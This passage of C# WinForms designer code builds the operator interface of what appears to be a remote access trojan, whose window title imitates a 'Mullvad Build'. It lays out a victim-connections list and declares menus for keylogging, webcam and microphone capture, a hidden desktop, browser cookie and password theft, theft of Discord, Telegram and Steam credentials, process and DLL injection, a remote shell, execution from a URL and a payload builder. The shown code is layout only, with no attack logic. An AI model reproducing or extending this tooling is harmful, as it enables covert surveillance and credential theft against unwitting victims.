            colOS.Text        = "Operating System";     colOS.Width        = 120;
            colOSEdition.Text = "OS Edition";           colOSEdition.Width = 175;
            colArch.Text      = "Architecture";         colArch.Width      = 80;
            colGroup.Text     = "Tag";                  colGroup.Width     = 80;
            colInstalled.Text = "Installed";            colInstalled.Width = 130;
            colNotes.Text     = "Notes";                colNotes.Width     = 80;
            listViewConnections.Columns.AddRange(new ColumnHeader[]
            {
                colInfo, colName, colOS, colOSEdition, colArch, colGroup, colInstalled, colNotes
            });
            listViewConnections.Dock          = DockStyle.Fill;
            listViewConnections.View         = View.Details;
            listViewConnections.FullRowSelect = true;
            listViewConnections.GridLines     = false;
            listViewConnections.MultiSelect   = true;
            listViewConnections.Font          = new Font("Segoe UI", 9F);
            listViewConnections.ForeColor     = Color.Black;
            listViewConnections.SmallImageList = imgListMain;
            listViewConnections.OwnerDraw     = true;
            listViewConnections.DrawColumnHeader += (s, e) => e.DrawDefault = true;
            listViewConnections.DrawItem         += (s, e) => e.DrawDefault = false;
            listViewConnections.DrawSubItem      += DrawSubItemMain;
            listViewConnections.SelectedIndexChanged += listViewConnections_SelectedIndexChanged;
            listViewConnections.ContextMenuStrip  = contextMenuConnections;

            // ---- Right-side details panel ----
            BuildDetailsPanel();

            // ---- Right panel ----
            panelRight.Dock = DockStyle.Fill;
            panelRight.Controls.Add(listViewConnections);

            // ---- Right split (connections | details) ----
            splitContainerRight.Dock = DockStyle.Fill;
            splitContainerRight.Panel1.Controls.Add(panelRight);
            splitContainerRight.Panel2.Controls.Add(panelDetails);

            // ---- SplitContainer ----
            splitContainerMain.Dock = DockStyle.Fill;
            splitContainerMain.Panel1.Controls.Add(listViewSide);
            splitContainerMain.Panel2.Controls.Add(splitContainerRight);

            // ---- Status strip ----
            statusLabel.Text      = "Ready";
            statusLabel.Spring    = true;
            statusLabel.TextAlign = ContentAlignment.MiddleLeft;
            statusStrip1.Items.Add(statusLabel);

            // ---- Form ----
            contextMenuSide.ResumeLayout(false);
            contextMenuConnections.ResumeLayout(false);
            splitContainerRight.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)splitContainerRight).EndInit();
            splitContainerMain.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)splitContainerMain).EndInit();
            menuStrip1.ResumeLayout(false);
            menuStrip1.PerformLayout();

            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode       = AutoScaleMode.Font;
            ClientSize          = new Size(1200, 666);
            StartPosition       = FormStartPosition.CenterScreen;
            Text                = $"Mullvad Build {DateTime.Now:yyyyMMdd}-{new Random().NextInt64(10000000000, 99999999999)} [{BuildConfig}]";
            Font                = new Font("Segoe UI", 9F);
            MainMenuStrip       = menuStrip1;
            Controls.Add(splitContainerMain);
            Controls.Add(toolStrip1);
            Controls.Add(menuStrip1);
            Controls.Add(statusStrip1);
            Load += (s, e) =>
            {
                splitContainerMain.Panel1MinSize    = 100;
                splitContainerMain.Panel2MinSize    = 200;
                splitContainerMain.SplitterDistance = 220;
                splitContainerRight.Panel1MinSize    = 200;
                splitContainerRight.Panel2MinSize    = 100;
                // Right details panel ~280px.
                splitContainerRight.SplitterDistance = Math.Max(200, splitContainerRight.Width - 280);
            };
            ResumeLayout(false);
            PerformLayout();
        }

        private void LoadContextMenuIcons()
        {
            IconLoader.SetIcon(menuAccept,  "done.png");
            IconLoader.SetIcon(menuDecline, "cancel.png");
            IconLoader.SetIcon(menuDetails, "information.png");
        }

        private void BuildDetailsPanel()
        {
            panelDetails.Dock    = DockStyle.Fill;
            panelDetails.Padding = new Padding(6, 0, 6, 6);

            pbPreview.Dock        = DockStyle.Top;
            pbPreview.Height      = 190;
            pbPreview.BackColor   = Color.Black;
            pbPreview.SizeMode    = PictureBoxSizeMode.StretchImage;
            pbPreview.BorderStyle = BorderStyle.FixedSingle;

            panelActionRow.Dock    = DockStyle.Top;
            panelActionRow.Height  = 38;
            panelActionRow.Padding = new Padding(0, 4, 0, 4);

            var actions = new (string icon, string tip, Action click)[]
            {
                ("folder.png",              "File Explorer",     () => btnReconnect_Click(null!, EventArgs.Empty)),
                ("application_cascade.png", "Task Manager",      () => btnTerminate_Click(null!, EventArgs.Empty)),
                ("registry.png",            "Registry Editor",   () => menuMgmtRegistry_Click(null!, EventArgs.Empty)),
                ("terminal.png",            "Hidden Desktop",    () => menuHiddenDesktop_Click(null!, EventArgs.Empty)),
                ("monitor.png",             "Remote Desktop",    () => btnUninstall_Click(null!, EventArgs.Empty)),
                ("information.png",         "System Information",() => btnSysInfo_Click(null!, EventArgs.Empty)),
                ("server_disconnect.png",   "Disconnect",        () => btnDisconnect_Click(null!, EventArgs.Empty)),
            };

            int x = 0;
            foreach (var (icon, tip, click) in actions)
            {
                var btn = new Button
                {
                    Left       = x,
                    Top        = 2,
                    Width      = 28,
                    Height     = 28,
                    FlatStyle  = FlatStyle.Standard,
                    ImageAlign = ContentAlignment.MiddleCenter,
                    TabStop    = false,
                    Text       = "",
                };
                var img = mullvad.Theme.IconLoader.Load(icon);
                if (img is not null) btn.Image = img;
                else                 btn.Text  = tip.Substring(0, 1);
                var tt = new ToolTip();
                tt.SetToolTip(btn, tip);
                btn.Click += (_, _) => click();
                panelActionRow.Controls.Add(btn);
                x += 32;
            }

            // ---- System Info group ----
            grpSysInfo.Text    = "System Info";
            grpSysInfo.Dock    = DockStyle.Fill;
            grpSysInfo.Padding = new Padding(6, 6, 6, 6);

            colSysKey.Text   = "";  colSysKey.Width   = 100;
            colSysValue.Text = "";  colSysValue.Width = 240;
            lvSysInfo.Columns.AddRange(new ColumnHeader[] { colSysKey, colSysValue });
            lvSysInfo.Dock           = DockStyle.Fill;
            lvSysInfo.View           = View.Details;
            lvSysInfo.FullRowSelect  = true;
            lvSysInfo.HeaderStyle    = ColumnHeaderStyle.None;
            lvSysInfo.GridLines      = false;
            lvSysInfo.MultiSelect    = false;
            lvSysInfo.HideSelection  = true;
            lvSysInfo.SmallImageList = imgListSysInfo;

            LoadSysInfoIcons();

            // Seed empty rows so the layout is stable before a client is selected.
            AddSysInfoRow("compuser", "Comp/User", "--");
            AddSysInfoRow("os",       "OS",        "--");
            AddSysInfoRow("latency",  "Latency",   "--");
            AddSysInfoRow("ram",      "RAM",       "--");
            AddSysInfoRow("cpu",      "CPU",       "--");
            AddSysInfoRow("uptime",   "UpTime",    "--");
            AddSysInfoRow("idle",     "Idle Time", "--");
            AddSysInfoRow("window",   "Window",    "--");

            grpSysInfo.Controls.Add(lvSysInfo);

            // Add in reverse dock order so the layout is: preview on top, action row
            // below it, sys-info fills the rest.
            panelDetails.Controls.Add(grpSysInfo);
            panelDetails.Controls.Add(panelActionRow);
            panelDetails.Controls.Add(pbPreview);
        }

        private void LoadSysInfoIcons()
        {
            var map = new (string key, string file)[]
            {
                ("compuser", "computer.png"),
                ("os",       "cog.png"),
                ("latency",  "lightning.png"),
                ("ram",      "bricks.png"),
                ("cpu",      "monitoring.png"),
                ("uptime",   "restart.png"),
                ("idle",     "standby.png"),
                ("window",   "application.png"),
            };
            foreach (var (key, file) in map)
            {
                var img = mullvad.Theme.IconLoader.Load(file);
                if (img is not null) imgListSysInfo.Images.Add(key, img);
            }
        }

        private void AddSysInfoRow(string key, string label, string value)
        {
            var lvi = new ListViewItem(label) { ImageKey = key, Name = key };
            lvi.SubItems.Add(value);
            lvSysInfo.Items.Add(lvi);
        }

        private static void TrySetIcon(ToolStripMenuItem item, string filename)
        {
            IconLoader.SetIcon(item, filename);
        }

        #endregion

        private MenuStrip            menuStrip1;
        private ToolStripMenuItem    menuFile;
        private ToolStripMenuItem    menuFileNew;
        private ToolStripMenuItem    menuFileOpen;
        private ToolStripMenuItem    menuFileSave;
        private ToolStripSeparator   menuFileSep;
        private ToolStripMenuItem    menuFileExit;
        private ToolStripMenuItem    menuEdit;
        private ToolStripMenuItem    menuEditCopy;
        private ToolStripMenuItem    menuEditPaste;
        private ToolStripMenuItem    menuEditDelete;
        private ToolStripMenuItem    menuView;
        private ToolStripMenuItem    menuViewRefresh;
        private ToolStripMenuItem    menuViewColumns;
        private ToolStripMenuItem    menuTools;
        private ToolStripMenuItem    menuToolsSettings;
        private ToolStripMenuItem    menuHelp;
        private ToolStripMenuItem    menuHelpAbout;
        private ToolStripMenuItem    menuVps;
        private ToolStripMenuItem    menuVpsHost;
        private ToolStripMenuItem    menuVpsConnect;
        private ToolStripSeparator   menuVpsSep;
        private ToolStripMenuItem    menuVpsStop;

        private ToolStrip                toolStrip1;
        private ToolStripTextBox         tsSearch;
        private ToolStripButton          btnReconnect;
        private ToolStripButton          btnTerminate;
        private ToolStripButton          btnUninstall;
        private ToolStripButton          btnSysInfo;
        private ToolStripButton          btnDisconnect;
        private ToolStripSeparator       sep1;
        private ToolStripSeparator       sep2;
        private ToolStripButton          tsConnections;
        private ToolStripButton          tsDatabase;
        private ToolStripButton          tsScreens;
        private ToolStripButton          tsWebcams;
        private ToolStripButton          tsAutoTask;
        private ToolStripButton          tsPortConfig;
        private ToolStripButton          tsKeywords;
        private ToolStripButton          tsStealer;
        private ToolStripMenuItem        menuBuilder;
        private ToolStripMenuItem        menuBuilderBuild;
        private ToolStripMenuItem        menuBuilderOpenOutput;

        private ToolStripMenuItem        menuAbout;

        private SplitContainer       splitContainerMain;
        private SplitContainer       splitContainerRight;
        private Panel                panelDetails;
        private PictureBox           pbPreview;
        private Panel                panelActionRow;
        private GroupBox             grpSysInfo;
        private ListView             lvSysInfo;
        private ColumnHeader         colSysKey;
        private ColumnHeader         colSysValue;
        private ImageList            imgListSysInfo;
        private ListView             listViewSide;
        private ColumnHeader         colSideFlag;
        private ColumnHeader         colComputer;
        private ColumnHeader         colUsername;
        private Panel                panelRight;
        private ListView             listViewConnections;
        private ColumnHeader         colInfo;
        private ColumnHeader         colName;
        private ColumnHeader         colOS;
        private ColumnHeader         colOSEdition;
        private ColumnHeader         colArch;
        private ColumnHeader         colGroup;
        private ColumnHeader         colInstalled;
        private ColumnHeader         colNotes;
        private StatusStrip          statusStrip1;
        private ToolStripStatusLabel statusLabel;

        private ContextMenuStrip     contextMenuSide;
        private ToolStripMenuItem    menuAccept;
        private ToolStripMenuItem    menuDecline;
        private ToolStripSeparator   menuContextSep;
        private ToolStripMenuItem    menuDetails;

        private ContextMenuStrip     contextMenuConnections;
        // Management
        private ToolStripMenuItem    menuMgmt;
        private ToolStripMenuItem    menuMgmtSysInfo;
        private ToolStripMenuItem    menuMgmtTaskMgr;
        private ToolStripMenuItem    menuMgmtStartup;
        private ToolStripMenuItem    menuMgmtRegistry;
        private ToolStripMenuItem    menuMgmtServices;
        private ToolStripSeparator   menuMgmtSep;
        private ToolStripMenuItem    menuMgmtInstalledApps;
        private ToolStripMenuItem    menuMgmtFirewall;
        private ToolStripMenuItem    menuMgmtFileExplorer;
        // Information
        private ToolStripMenuItem    menuInformation;
        private ToolStripMenuItem    menuCompInfo;
        private ToolStripMenuItem    menuInfoSysInfo;
        private ToolStripMenuItem    menuInfoAdvSysInfo;
        private ToolStripMenuItem    menuInfoNetInfo;
        private ToolStripSeparator   menuInfoSep;
        private ToolStripMenuItem    menuInfoSaveAll;
        private ToolStripMenuItem    menuGeoInfo;
        private ToolStripMenuItem    menuGeoLoc;
        private ToolStripMenuItem    menuAdvGeoLoc;
        private ToolStripMenuItem    menuGpsExploit;
        private ToolStripSeparator   menuGeoSep;
        private ToolStripMenuItem    menuGeoSaveAll;
        // Remote Management
        private ToolStripMenuItem    menuRemoteMgmt;
        private ToolStripMenuItem    menuRemoteScripting;
        private ToolStripMenuItem    menuRemoteExecute;
        private ToolStripMenuItem    menuRemoteExecDisk;
        private ToolStripMenuItem    menuRemoteExecUrl;
        private ToolStripMenuItem    menuDllInjection;
        private ToolStripMenuItem    menuRemoteShell;
        // Surveillance
        private ToolStripMenuItem    menuSurveillance;
        private ToolStripMenuItem    menuKeylogger;
        private ToolStripMenuItem    menuClipboardMgr;

        private ToolStripMenuItem    menuRemoteWebcam;
        private ToolStripMenuItem    menuRemoteMic;
        private ToolStripMenuItem    menuRemoteMicSend;
        private ToolStripMenuItem    menuDesktopAudio;
        private ToolStripMenuItem    menuRemoteDesktop;
        private ToolStripMenuItem    menuRdpNormal;
        private ToolStripMenuItem    menuRdpH265;
        private ToolStripMenuItem    menuHiddenDesktop;
        // Credentials
        private ToolStripMenuItem    menuCredentials;
        private ToolStripMenuItem    menuRecoverCookies;
        private ToolStripMenuItem    menuRecoverHistory;
        private ToolStripMenuItem    menuRecoverPasswords;
        private ToolStripMenuItem    menuRunFullRecovery;
        private ToolStripSeparator   menuCredsSep;
        private ToolStripMenuItem    menuAppsQuick;
        private ToolStripMenuItem    menuAppsDiscord;
        private ToolStripMenuItem    menuAppsTelegram;
        private ToolStripMenuItem    menuAppsSteam;
        private ToolStripMenuItem    menuAppsSkype;
        private ToolStripMenuItem    menuAppsWechat;
        private ToolStripMenuItem    menuInstalledBrowsers;
        // Post Modules
        private ToolStripMenuItem    menuPostModules;
        private ToolStripMenuItem    menuProcessMigration;
        private ToolStripMenuItem    menuProcessInjection;
        private ToolStripMenuItem    menuBrowserInspection;
        // Network
        private ToolStripMenuItem    menuNetwork;
        private ToolStripMenuItem    menuNetworkInfo;
        private ToolStripMenuItem    menuAdvNetworkInfo;
        private ToolStripMenuItem    menuMapNetwork;
        private ToolStripSeparator   menuNetworkSep;
        private ToolStripMenuItem    menuSaveAll;
        // Connection
        private ToolStripMenuItem    menuConnection;
        private ToolStripMenuItem    menuOpenClientFolder;
        private ToolStripMenuItem    menuDisconnect;
        private ToolStripMenuItem    menuConnUninstall;
        private ToolStripMenuItem    menuUpdate;
        private ToolStripSeparator   menuConnectionSep;
        private ToolStripMenuItem    menuConnReconnect;
        private ToolStripMenuItem    menuConnDetails;
        // Select All
        private ToolStripSeparator   menuMainSep;
        private ToolStripMenuItem    menuSelectAll;

        private ToolStripSeparator   menuSideSep2;
        private ToolStripMenuItem    menuAutoRules;
        private ToolStripMenuItem    menuAutoAccept;
        private ToolStripMenuItem    menuAutoDecline;

        private ImageList            imgListSide;
        private ImageList            imgListMain;
    }
}

